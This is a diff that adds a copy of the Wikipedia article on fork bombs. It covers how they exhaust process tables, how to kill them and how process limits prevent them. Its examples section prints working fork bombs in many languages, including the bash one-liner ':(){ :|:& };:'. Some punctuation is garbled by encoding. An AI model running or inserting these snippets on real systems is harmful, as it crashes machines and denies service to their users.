@@ -1,0 +1,207 @@
+http://en.wikipedia.org/wiki/Fork_bomb
+
+Fork bomb
+From Wikipedia, the free encyclopedia
+Jump to: navigation, search
+The concept behind the fork bomb: the processes recursively fork until a denial of service or a crash occurs
+
+In computing, the fork bomb, a form of denial-of-service attack against a computer system, implements the fork operation (or equivalent functionality) whereby a running process can create another running process. Fork bombs count as wabbits: they typically do not spread as worms or viruses. To incapacitate a system they rely on the (generally valid) assumption that the number of programs and processes which may execute simultaneously on a computer, has a limit.
+
+A fork bomb works by creating a large number of processes very quickly in order to saturate the available space in the list of processes kept by the computer's operating system. If the process table becomes saturated, no new programs may start until another process terminates. Even if that happens, it is not likely that a useful program may be started since the instances of the bomb program will each attempt to take any newly-available slot themselves.
+
+Not only do fork bombs use space in the process table: each child process uses further processor-time and memory. As a result of this, the system and existing programs slow down and become much more unresponsive and difficult or even impossible to use.
+
+As well as being specifically malicious, fork bombs can occur by accident in the normal development of software. The development of an application that listens on a network socket and acts as the server in a Client-server system may well use an infinite loop and fork operation in a manner similar to one of the programs presented below. A trivial bug in the source of this kind of application could cause a fork bomb during testing.
+Contents
+
+    * 1 Example fork bombs
+    * 2 Difficulty of cure
+    * 3 Prevention
+    * 4 Notes
+    * 5 See also
+    * 6 External links
+
+[edit] Example fork bombs
+
+The following code provides arguably one of the most elegant examples of a fork bomb. Jaromil presented it as an open-source piece of art in 2002. The user executes the fork bomb by pasting the following 13 characters into a UNIX shell such as bash or zsh.[1]
+
+:(){ :|:& };:
+
+Understanding the above:
+
+:()      # define ':' -- whenever we say ':', do this:
+{        # beginning of what to do when we say ':'
+    :    # load another copy of the ':' function into memory...
+    |    # ...and pipe its output to...
+    :    # ...another copy of ':' function, which has to be loaded into memory
+         # (therefore, ':|:' simply gets two copies of ':' loaded whenever ':' is called)
+    &    # disown the functions -- if the first ':' is killed, all of the functions that it has started should NOT be auto-killed
+}        # end of what to do when we say ':'
+;        # Having defined ':', we should now...
+:        # ...call ':', initiating a chain-reaction: each ':' will start two more.
+
+Given that ':' is an arbitrary name for the function, an easier to understand version would be:
+
+forkbomb(){ forkbomb|forkbomb & } ; forkbomb
+
+A fork bomb using the Microsoft Windows (any version) batch language:
+
+%0|%0
+
+Or a faster-reacting example:
+
+:s
+start %0
+goto :s
+
+In poetic Perl:
+
+fork while fork
+
+In Haskell:
+
+import Control.Monad
+import System.Posix.Process
+ 
+forkBomb = forever $ forkProcess forkBomb
+
+In Python:
+
+import os
+ 
+while True:
+     os.fork()
+
+In Ruby:
+
+loop { fork }
+
+In UNIX C or C++:
+
+#include <unistd.h>
+ 
+int main(void)
+{
+  for(;;)
+    fork();
+  return 0;
+}
+
+In PHP (probably only for POSIX compatible systems):
+
+while(pcntl_fork()|1);
+
+In x86 FASM for Linux:
+
+format ELF executable
+entry start
+start:
+	push	0x2       ; Linux fork system call
+	pop	eax       ;
+	int	0x80      ; Call to the kernel
+	jmp	start     ; Loop back to the start
+
+In x86 FASM for Win32:
+
+format PE GUI 4.0
+entry start
+section '.text' code readable executable
+  start:
+        pushd 1000
+        pushd path
+        pushd 0
+        call [GetModuleFileName]
+   @@:
+        pushd 1
+        pushd 0
+        pushd 0
+        pushd path
+        pushd command
+        pushd 0
+        call [ShellExecute]
+        jmp @b
+section '.data' data readable writeable
+  path rb 1000
+  command db "open"
+section '.idata' import data readable writeable
+  dd 0,0,0,RVA kernel32id,RVA kernel32
+  dd 0,0,0,RVA shell32id,RVA shell32
+  kernel32:
+    GetModuleFileName dd RVA _GetModuleFileName
+    dd 0
+  shell32:
+    ShellExecute dd RVA _ShellExecute
+    dd 0
+  kernel32id db 'kernel32.dll',0
+  shell32id db 'shell32.dll',0
+  _GetModuleFileName dw 0
+    db 'GetModuleFileNameA',0
+  _ShellExecute dw 0
+    db 'ShellExecuteA',0
+section '.reloc' fixups data readable discardable
+
+In x86 NASM assembly for Linux more detailed:
+
+section .text
+ global _start ;Call start
+ 
+_start:
+ push byte 2      ;syscall to Linux fork
+ pop eax          ;set EAX argument for fork to NULL [So it works in strings]
+ int 0x80         ;Execute syscall with fork & the EAX [null, above] argument
+ jmp short _start ;Go back to beginning, causing a fork bomb
+
+Or in Lisp:
+
+ (defmacro wabbit ()                ;; A program that writes code.
+   (let ((fname (gentemp 'INET)))
+     `(progn
+            (defun ,fname ()        ;; Generate.
+              nil)
+            (wabbit))))
+ 
+(wabbit)    ;; Start multiplying.
+
+Java can also be used, although the fork bomb will only work if the javaw executable is on the path. This fork bomb can be stopped from multiplying by deleting the class file used to run it, although this will not terminate any instances of the fork bomb that have already started.
+
+public class ForkBomb
+{
+  public static void main(String[] args)
+  {
+    while(true)
+    {
+      Runtime.getRuntime().exec(new String[]{"javaw", "-cp", System.getProperty("java.class.path"), "ForkBomb"});
+    }
+  }
+}
+
+[edit] Difficulty of cure
+
+Once a successful fork bomb is active in a system, one may have to reboot to resume normal operation. Stopping a fork bomb requires destroying all running instances of it. Trying to use a program to kill the rogue processes normally requires creating another process ¡ª a difficult or impossible task if the host machine has no empty slots in the process table, or no space in memory structures. Furthermore, as processes of the bomb are terminated (for example using the kill(8) command), process slots become free and the remaining fork bomb threads can continue reproducing again, either because there are multiple CPU cores active in the system and/or the scheduler moved control away from kill(8) due to the time slice being used up.
+
+However, in practice, system administrators can suppress some of these fork bombs relatively easily. Consider the shell fork bomb shown below:
+
+:(){ :|:& };:
+
+One important "feature" in this code means that a fork bomb process which can no longer fork doesn't stick around but rather exits. If we try often enough, eventually we'll start a new do-nothing process; Each new do-nothing process we run reduces the number of rampant "fork bomb" processes by one, until eventually we can eradicate all of them, at which point the do-nothing processes can exit. The following short Z Shell code will typically get rid of the above fork bomb in about a minute:
+
+while (sleep 100 &!) do; done
+
+Alternatively, stopping (¡°freezing¡±) the bomb's processes can be used so that a subsequent kill/killall can terminate them without any of the parts re-replicating due to newly available process slots:
+
+killall -STOP processWithBombName
+killall -KILL processWithBombName
+
+[edit] Prevention
+
+One way to prevent a fork bomb involves limiting the number of processes that a single user may own. When a process tries to create another process and the owner of that process already owns more than the maximum, the creation fails. Administrators should set the maximum low enough so that if all the users who might simultaneously bomb a system do so, enough resources still remain to avoid disaster.
+
+Note that an accidental fork bomb is highly unlikely to involve more than one user. A Linux kernel patch exists ¡ª called grsecurity ¡ª that enables logging of which user has started a fork bomb.[2]
+
+Unix-type systems typically have a process-limit, controlled by a ulimit shell command.[3] Linux kernels set and enforce the RLIMIT_NPROC rlimit ("resource limit") of a process. If a process tries to perform a fork and the user that owns that process already owns more than RLIMIT_NPROC processes,then the fork fails. Additionally, on Linux or *BSD, one can edit the pam_limits config file: /etc/security/limits.conf[4] to the same effect. However, not all distributions of Linux have the pam_limits module installed by default.
+
+Another solution, not widely practised, involves the detection of fork bombs by the operating system. The Linux kernel module called rexFBD[5] implements this strategy.
+
+On FreeBSD the system administrator can put limits in login.conf[6] for every user, effectively preventing using too many processes, memory, time and other resources.
+
+Note that simply limiting the number of processes a process may create does not prevent a fork bomb, because each process that the fork bomb creates also creates processes. A distributive resource allocation system in which a process shares its parents' resources would work, but such distributive resource systems are not in common use.
